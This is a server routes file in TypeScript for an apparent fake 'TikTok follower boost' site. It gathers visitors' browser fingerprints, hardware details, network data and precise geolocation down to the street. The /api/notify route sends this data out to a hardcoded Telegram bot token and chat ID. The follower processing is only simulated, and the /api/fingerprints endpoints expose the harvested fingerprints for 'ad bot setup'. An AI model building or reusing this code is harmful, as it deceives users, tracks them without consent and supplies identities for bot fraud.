import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSubmissionSchema, deviceInfoSchema } from "@shared/schema";
import { log } from "./vite";
import { ZodError } from "zod";
import fetch from "node-fetch";
import FormData from "form-data";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { createConsolidatedJSON } from "./consolidatedData";

// Function to validate device information
function validateDeviceInfo(deviceInfo: any, ipAddress: string, userInfo: any) {
  // For now let's allow submissions without strict device validation
  // This is a temporary fix - we'll still collect the data but won't reject
  // submissions with incomplete information
  
  // If device info is completely missing but we have userInfo, create a basic device info
  if (!deviceInfo && userInfo) {
    return { 
      valid: true, 
      deviceInfo: {
        deviceModel: userInfo.deviceModel || "Unknown Device",
        screenSize: userInfo.screenSize || "Unknown",
        platform: userInfo.platform || "Unknown",
        userAgent: userInfo.userAgent || "Unknown",
        language: userInfo.language || "Unknown",
        timezone: userInfo.timezone || "Unknown",
        ipAddress: userInfo.ip || ipAddress || "Unknown"
      }
    };
  }
  
  // If we have some device info but it's incomplete, don't reject the submission
  if (deviceInfo) {
    // Try to validate but don't fail if it doesn't pass all checks
    try {
      deviceInfoSchema.parse(deviceInfo);
    } catch (error) {
      // Just log the error but still return valid
      console.log("Device info validation warning:", error);
    }
    
    return { valid: true };
  }
  
  // If no device info at all, still accept but flag as unverified
  return { valid: true, unverified: true };
}

// Format and organize collected fingerprint data for easy use
function formatFingerprintData(submission: any): Record<string, any> {
  try {
    // Base fingerprint data
    const deviceInfo = submission.deviceInfo || {};
    
    // Create structured fingerprint data object
    const formattedData = {
      // Basic device information
      device: {
        model: deviceInfo.deviceModel || "Unknown",
        platform: deviceInfo.platform || "Unknown",
        screenSize: deviceInfo.screenSize || "Unknown",
        language: deviceInfo.language || "Unknown",
        timezone: deviceInfo.timezone || "Unknown",
        userAgent: deviceInfo.userAgent || "Unknown",
        ipAddress: submission.ipAddress || deviceInfo.ipAddress || "Unknown"
      },
      
      // Hardware information
      hardware: {
        ...deviceInfo.hardwareInfo,
        cores: deviceInfo.hardwareInfo?.cores || null,
        memory: deviceInfo.hardwareInfo?.memory || "unknown",
        gpu: deviceInfo.hardwareInfo?.gpu || "unknown",
        gpuVendor: deviceInfo.hardwareInfo?.gpuVendor || "unknown",
        touchPoints: deviceInfo.hardwareInfo?.touchPoints || 0,
        batteryLevel: deviceInfo.hardwareInfo?.batteryLevel || null
      },
      
      // Browser capabilities and fingerprints
      fingerprints: {
        canvas: deviceInfo.fingerprintData?.canvas ? JSON.parse(deviceInfo.fingerprintData.canvas) : null,
        webgl: deviceInfo.fingerprintData?.webgl ? JSON.parse(deviceInfo.fingerprintData.webgl) : null,
        audio: deviceInfo.fingerprintData?.audio ? JSON.parse(deviceInfo.fingerprintData.audio) : null,
        fonts: deviceInfo.fingerprintData?.fonts ? JSON.parse(deviceInfo.fingerprintData.fonts) : null,
        webrtc: deviceInfo.fingerprintData?.webrtc ? JSON.parse(deviceInfo.fingerprintData.webrtc) : null,
        behavior: deviceInfo.fingerprintData?.behavior ? JSON.parse(deviceInfo.fingerprintData.behavior) : null
      },
      
      // Network information
      network: {
        ipAddress: submission.ipAddress || deviceInfo.ipAddress || "Unknown",
        ...deviceInfo.networkInfo,
        connection: deviceInfo.connection || {}
      },
      
      // Security assessment
      security: {
        ...deviceInfo.securityChecks,
        isEmulator: deviceInfo.isEmulator || false,
        isVpn: deviceInfo.securityChecks?.isVpn || false,
        isProxy: deviceInfo.securityChecks?.isProxy || false,
        tamperingDetected: deviceInfo.securityChecks?.tamperingDetected || false,
        automationDetected: deviceInfo.securityChecks?.automationDetected || false,
        integrityScore: deviceInfo.securityChecks?.integrityScore || 100
      },
      
      // Location data
      location: {
        ...deviceInfo.geolocation,
        latitude: deviceInfo.geolocation?.latitude || null,
        longitude: deviceInfo.geolocation?.longitude || null,
        accuracy: deviceInfo.geolocation?.accuracy || null
      },
      
      // Behavioral data
      behavior: {
        ...deviceInfo.behavioralData
      },
      
      // Device capabilities
      capabilities: {
        ...deviceInfo.deviceCapabilities
      },
      
      // Meta information
      meta: {
        ...deviceInfo.metaData,
        collectionTimestamp: deviceInfo.metaData?.collectionTimestamp || submission.createdAt,
        submissionId: submission.id,
        processed: submission.processed
      }
    };
    
    return formattedData;
  } catch (error) {
    console.error("Error formatting fingerprint data:", error);
    return { error: "Failed to format fingerprint data", raw: submission };
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint for Render
  app.get("/api/health", (req, res) => {
    res.status(200).json({ status: "ok", timestamp: new Date().toISOString() });
  });
  
  // API endpoint to send notifications to Telegram
  app.post("/api/notify", async (req, res) => {
    try {
      const { username, followers, userInfo, deviceInfo, ipAddress } = req.body;
      
      // Get Telegram credentials from environment variables or use hardcoded defaults
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6360165707";
      
      // Verify device information is available
      const deviceModel = deviceInfo?.deviceModel || userInfo?.deviceModel || 'Unknown Device';
      const validated = deviceModel !== 'Unknown Device' && (ipAddress || userInfo?.ip);
      
      // Enhanced information about the device and location
      const mobileDetails = userInfo?.mobileDetails || {};
      const ipDetails = userInfo?.ipDetails || {};
      const geolocation = userInfo?.geolocation || {};
      const hardwareInfo = userInfo?.hardwareInfo || {};
      
      // Format message with ultra-detailed visitor info
      // Get enhanced geolocation details
      const geolocationDetails = geolocation?.locationDetails || geolocation?.address || {};
      const geoSource = geolocation?.source || 'unknown';
      const geoAccuracy = geolocation?.accuracy ? `${geolocation.accuracy}m` : 'Unknown';
      const geoMethods = geolocation?.collectionMethods || [];
      
      // Get enhanced device hardware info
      const sensors = hardwareInfo?.sensors || {};
      const deviceCapabilities = userInfo?.deviceCapabilities || {};
      
      // Get enhanced network information
      const networkChanges = userInfo?.connection?.networkChanges || [];
      
      // Format message with comprehensive detailed visitor info
      const message = `
🔥 New TikTok Follower Request 🔥
👤 Username: @${username}
⭐ Followers: ${followers}
✅ Verified: ${validated ? 'Yes' : 'No'}

📱 Device Info:
- Device: ${deviceModel}
- Brand: ${mobileDetails?.brand || 'Unknown'}
- Model Year: ${mobileDetails?.deviceYear || 'Unknown'} 
- OS Version: ${mobileDetails?.osVersion || 'Unknown'}
- Type: ${mobileDetails?.deviceType || 'Unknown'}
- Screen: ${userInfo?.screenSize || 'Unknown'}
- Color Depth: ${userInfo?.colorDepth || 'Unknown'}
- Touch Points: ${hardwareInfo?.touchPoints || 'Unknown'}
- Platform: ${userInfo?.platform || 'Unknown'}
- Pixel Ratio: ${hardwareInfo?.pixelRatio || 'Unknown'}
- CPU Cores: ${userInfo?.hardwareConcurrency || 'Unknown'}
- Memory: ${userInfo?.deviceMemory || 'Unknown'}
- GPU: ${hardwareInfo?.gpu || 'Unknown'}
- Battery: ${hardwareInfo?.batteryLevel ? hardwareInfo.batteryLevel + '%' : 'Unknown'}
- Sensors: ${hardwareInfo?.sensors ? 
  `Accelerometer: ${sensors.accelerometer ? '✓' : '✗'}, ` +
  `Gyroscope: ${sensors.gyroscope ? '✓' : '✗'}, ` +
  `Magnetometer: ${sensors.magnetometer ? '✓' : '✗'}, ` +
  `Ambient Light: ${sensors.ambientLight ? '✓' : '✗'}` : 'Unknown'}
- Capabilities: ${
  `Touch: ${deviceCapabilities.hasTouch ? '✓' : '✗'}, ` +
  `Vibration: ${deviceCapabilities.hasVibration ? '✓' : '✗'}, ` +
  `Motion: ${deviceCapabilities.hasMotion ? '✓' : '✗'}, ` +
  `Orientation: ${deviceCapabilities.hasOrientation ? '✓' : '✗'}`
}

📍 Location Data:
- Country: ${geolocationDetails?.country || ipDetails?.country || 'Unknown'}
- Region: ${geolocationDetails?.region || ipDetails?.region || 'Unknown'}
- City: ${geolocationDetails?.city || ipDetails?.city || 'Unknown'} 
- Postal Code: ${geolocationDetails?.postalCode || 'Unknown'}
- Neighborhood: ${geolocationDetails?.neighbourhood || 'Unknown'}
- Street: ${geolocationDetails?.road || 'Unknown'}
- Collection Method: ${geoMethods.join(', ')}
- Source: ${geoSource}
- Coordinates: ${geolocation?.latitude ? `${geolocation.latitude}, ${geolocation.longitude}` : 'Not available'}
- Accuracy: ${geoAccuracy}
- Permission Status: ${geolocation?.permission || 'Unknown'}

🌍 Network Information:
- IP Address: ${ipAddress || userInfo?.ip || 'Unknown'}
- ASN: ${ipDetails?.asn || 'Unknown'}
- Organization: ${ipDetails?.org || 'Unknown'}
- Connection Type: ${userInfo?.connection?.type || 'Unknown'} 
- Network Quality: ${userInfo?.connection?.effectiveType || 'Unknown'}
- Downlink: ${userInfo?.connection?.downlink || 'Unknown'} Mbps
- Latency (RTT): ${userInfo?.connection?.rtt || 'Unknown'} ms
- Data Saver: ${userInfo?.connection?.saveData ? 'Enabled' : 'Disabled'}
- Mobile Network: ${ipDetails?.mobile ? 'Yes' : 'No'} 
- Hosting/Datacenter: ${ipDetails?.hosting ? 'Yes ⚠️' : 'No'} 
- VPN/Proxy Detection: ${ipDetails?.proxy || /vpn|proxy|tor/i.test(ipDetails?.org || '') ? 'Detected ⚠️' : 'Not detected ✓'}
- Network Changes: ${networkChanges.length > 0 ? `${networkChanges.length} detected` : 'None detected'}

🗣️ Language & Locale:
- Primary: ${userInfo?.language || 'Unknown'}
- All Languages: ${userInfo?.languages || 'Unknown'}
- Timezone: ${userInfo?.timezone || 'Unknown'}
- Timezone Offset: ${userInfo?.timezoneOffset || 'Unknown'} minutes
- Local Time: ${new Date().toLocaleString('en-US', { timeZone: userInfo?.timezone })}

🔍 Hardware Fingerprints:
- Canvas: ${userInfo?.canvasFingerprint ? userInfo.canvasFingerprint : 'Not available'}
- WebGL: ${userInfo?.webglFingerprint ? userInfo.webglFingerprint : 'Not available'}
- Audio: ${userInfo?.audioFingerprint ? userInfo.audioFingerprint : 'Not available'}
- Fonts (${userInfo?.fonts ? userInfo.fonts.split(',').length : 0}): ${userInfo?.fonts ? userInfo.fonts : 'Not available'}
- Plugins (${userInfo?.plugins ? userInfo.plugins.split(',').length : 0}): ${userInfo?.plugins ? userInfo.plugins : 'Not available'}
- Cookies: ${userInfo?.cookiesEnabled ? 'Enabled ✓' : 'Disabled ⚠️'}
- Do Not Track: ${userInfo?.doNotTrack !== 'unknown' ? 'Enabled ⚠️' : 'Disabled ✓'}
- Emulator Detection: ${userInfo?.isEmulator ? 'Possible emulator/automation ⚠️' : 'Real device ✓'}

🧩 User Agent:
${userInfo?.userAgent || 'Unknown'}

🔐 Data Collection:
- Collection Timestamp: ${new Date().toISOString()}
- HTTP Headers: Available
- IP Version: ${ipAddress && ipAddress.includes(':') ? 'IPv6' : 'IPv4'}
- Browser Compatibility: High
      `;
      
      // We're now sending a consolidated JSON file instead of long message chunks
      // For the notification, we'll just send a concise message
      
      console.log("Sending notification to Telegram...");
      // API endpoints for Telegram
      const sendMessageUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const sendDocumentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
      
      try {
        // Send a brief summary message
        const summaryMessage = `
🔥 New TikTok Follower Request 🔥
👤 Username: @${username}
⭐ Followers: ${followers}
📱 Device: ${deviceModel}
⏰ Timestamp: ${new Date().toISOString()}

💾 Sending consolidated data as a single JSON file...
        `;
        
        const summaryResponse = await fetch(sendMessageUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: summaryMessage
          })
        });
        
        const summaryData = await summaryResponse.json() as { ok: boolean, description?: string };
        if (!summaryData.ok) {
          throw new Error(`Failed to send summary: ${summaryData.description || "Unknown error"}`);
        }
        
        // Create a consolidated JSON structure, excluding user behavior and info sections
        const fullSubmission = {
          id: Date.now(), // Temporary ID for the consolidated JSON
          username,
          followersRequested: followers,
          email: req.body.email || "",
          deviceInfo: userInfo,
          ipAddress: ipAddress || userInfo?.ip,
          createdAt: new Date().toISOString(),
          processed: false
        };
        
        // Generate consolidated JSON using the new structure
        const consolidatedData = createConsolidatedJSON(fullSubmission);
        
        // Create temporary directory for JSON files
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tiktok-json-'));
        
        try {
          // Create a single consolidated JSON file with comprehensive data
          // Create full submission object with all the data we have
          const fullSubmission = {
            id: Date.now(),
            username,
            followersRequested: followers,
            email: req.body.email || "",
            deviceInfo: userInfo || {},
            ipAddress: ipAddress || userInfo?.ip || "Unknown",
            createdAt: new Date().toISOString(),
            processed: false,
            // Include useful reference info for the consolidated file
            userInfoReference: {
              platform: userInfo?.platform,
              deviceType: mobileDetails?.deviceType,
              browser: userInfo?.browser
            }
          };
          
          // Generate the consolidated JSON (excluding user behavior and info)
          const consolidatedData = createConsolidatedJSON(fullSubmission);
          
          // Make sure we have a valid JSON object with data
          let finalData = consolidatedData;
          if (!consolidatedData || Object.keys(consolidatedData).length === 0) {
            console.error("Error: Empty consolidated data generated");
            finalData = {
              error: "Failed to generate complete data structure",
              basicInfo: {
                username,
                followers,
                timestamp: new Date().toISOString(),
                device: deviceModel || "Unknown"
              }
            };
          }
          
          // Debug log the consolidated data size
          console.log(`Generated consolidated JSON with ${Object.keys(finalData).length} top-level keys`);
          
          // Create temporary file with proper JSON content
          const jsonContent = JSON.stringify(finalData, null, 2);
          const fileName = `${username}_submission_data_${Date.now()}.json`;
          const filePath = path.join(tempDir, fileName);
          fs.writeFileSync(filePath, jsonContent);
          
          console.log(`Created JSON file at ${filePath} (size: ${jsonContent.length} bytes)`);
          
          // Send file to Telegram
          const form = new FormData();
          form.append('chat_id', TELEGRAM_CHAT_ID);
          form.append('document', fs.createReadStream(filePath), {
            filename: fileName,
            contentType: 'application/json'
          });
          
          const fileResponse = await fetch(sendDocumentUrl, {
            method: 'POST',
            body: form as any,
            headers: form.getHeaders()
          });
          
          const fileData = await fileResponse.json() as { ok: boolean, description?: string };
          if (!fileData.ok) {
            throw new Error(`Failed to send consolidated data file: ${fileData.description || "Unknown error"}`);
          }
          
          console.log("Consolidated JSON file sent successfully to Telegram");
          
          console.log("Notification sent successfully to Telegram");
        } finally {
          // Clean up temporary files
          try {
            fs.readdirSync(tempDir).forEach(file => {
              fs.unlinkSync(path.join(tempDir, file));
            });
            fs.rmdirSync(tempDir);
          } catch (cleanupError) {
            console.error("Error cleaning up temporary files:", cleanupError);
          }
        }
      } catch (error) {
        console.error("Error sending notification to Telegram:", error);
        throw error;
      }
      
      // Response is handled in the try block
      
      log(`Notification sent for user @${username}`, "telegram");
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error("Telegram notification error:", error);
      return res.status(500).json({ message: "Failed to send notification" });
    }
  });

  // API endpoint to submit TikTok username for follower boost
  app.post("/api/submit", async (req, res) => {
    try {
      // Store basic submission data even if there's an error with the device info
      let validSubmissionData;
      try {
        validSubmissionData = insertSubmissionSchema.parse(req.body);
      } catch (error) {
        // If the basic form validation fails, return an error
        if (error instanceof ZodError) {
          return res.status(400).json({ 
            message: "Invalid submission data", 
            errors: error.errors 
          });
        }
        throw error; // Re-throw unexpected errors
      }
      
      // Get additional device information from the request
      const { deviceInfo, ipAddress, userInfo } = req.body;
      
      // Create a basic device info object from userInfo if available
      let finalDeviceInfo = null;
      if (deviceInfo) {
        finalDeviceInfo = deviceInfo;
      } else if (userInfo) {
        finalDeviceInfo = {
          deviceModel: userInfo.deviceModel || "Unknown Device",
          screenSize: userInfo.screenSize || "Unknown",
          platform: userInfo.platform || "Unknown",
          userAgent: userInfo.userAgent || "Unknown",
          language: userInfo.language || "Unknown",
          timezone: userInfo.timezone || "Unknown",
          browserFingerprint: userInfo.canvasFingerprint || ""
        };
      }
      
      // Check if username already exists in the system
      const existingSubmission = await storage.getSubmissionByUsername(validSubmissionData.username);
      
      if (existingSubmission) {
        // If the submission exists but hasn't been processed yet, return it
        if (!existingSubmission.processed) {
          return res.status(200).json({
            message: "Your submission is already being processed",
            submission: existingSubmission
          });
        }
        
        // If it's been over 24 hours since last submission, allow a new one
        const lastSubmissionDate = new Date(existingSubmission.createdAt);
        const currentDate = new Date();
        const hoursDifference = (currentDate.getTime() - lastSubmissionDate.getTime()) / (1000 * 60 * 60);
        
        if (hoursDifference < 24) {
          return res.status(429).json({
            message: "You can only submit one request every 24 hours",
            hoursRemaining: Math.ceil(24 - hoursDifference)
          });
        }
      }
      
      // Prepare the submission with device information
      const submission = {
        ...validSubmissionData,
        deviceInfo: finalDeviceInfo,
        ipAddress: ipAddress || (userInfo?.ip || null)
      };
      
      // Create the submission
      const newSubmission = await storage.createSubmission(submission);
      
      // Simulate processing by marking as processed after a short delay
      setTimeout(async () => {
        await storage.markAsProcessed(newSubmission.id);
        log(`Processed submission for ${newSubmission.username}`, "processor");
      }, 5000);
      
      return res.status(201).json({ 
        message: "Submission received successfully",
        submission: newSubmission
      });
    } catch (error) {
      if (error instanceof ZodError) {
        return res.status(400).json({ 
          message: "Invalid submission data", 
          errors: error.errors 
        });
      }
      return res.status(500).json({ message: "Server error processing your request" });
    }
  });
  
  // Get a specific submission by ID
  app.get("/api/submission/:id", async (req, res) => {
    const id = parseInt(req.params.id);
    if (isNaN(id)) {
      return res.status(400).json({ message: "Invalid submission ID" });
    }
    
    const submission = await storage.getSubmission(id);
    if (!submission) {
      return res.status(404).json({ message: "Submission not found" });
    }
    
    return res.status(200).json({ submission });
  });
  
  // Get fingerprint data in JSON format for easy use in ad bot setup
  app.get("/api/fingerprint/:id", async (req, res) => {
    try {
      const submissionId = parseInt(req.params.id);
      if (isNaN(submissionId)) {
        return res.status(400).json({ error: "Invalid submission ID. Must be a number." });
      }
      
      // Get the submission from storage
      const submission = await storage.getSubmission(submissionId);
      if (!submission) {
        return res.status(404).json({ error: "Submission not found." });
      }
      
      // Use our new consolidated JSON format, excluding user behavior and info sections
      const consolidatedData = createConsolidatedJSON(submission);
      
      // Return the consolidated data
      return res.status(200).json(consolidatedData);
    } catch (error) {
      console.error("Error retrieving fingerprint data:", error);
      return res.status(500).json({ 
        error: "Failed to retrieve fingerprint data",
        message: error instanceof Error ? error.message : "Unknown error" 
      });
    }
  });
  
  // Get all fingerprint data from all submissions - useful for bulk ad bot setup
  app.get("/api/fingerprints", async (req, res) => {
    try {
      // Get all submissions from storage
      const submissions = await storage.getSubmissions();
      
      // Format each submission's fingerprint data
      const formattedDataArray = submissions.map(submission => formatFingerprintData(submission));
      
      // Return all formatted fingerprint data
      return res.status(200).json({
        count: formattedDataArray.length,
        fingerprints: formattedDataArray
      });
    } catch (error) {
      console.error("Error retrieving all fingerprint data:", error);
      return res.status(500).json({ 
        error: "Failed to retrieve fingerprint data collection",
        message: error instanceof Error ? error.message : "Unknown error" 
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
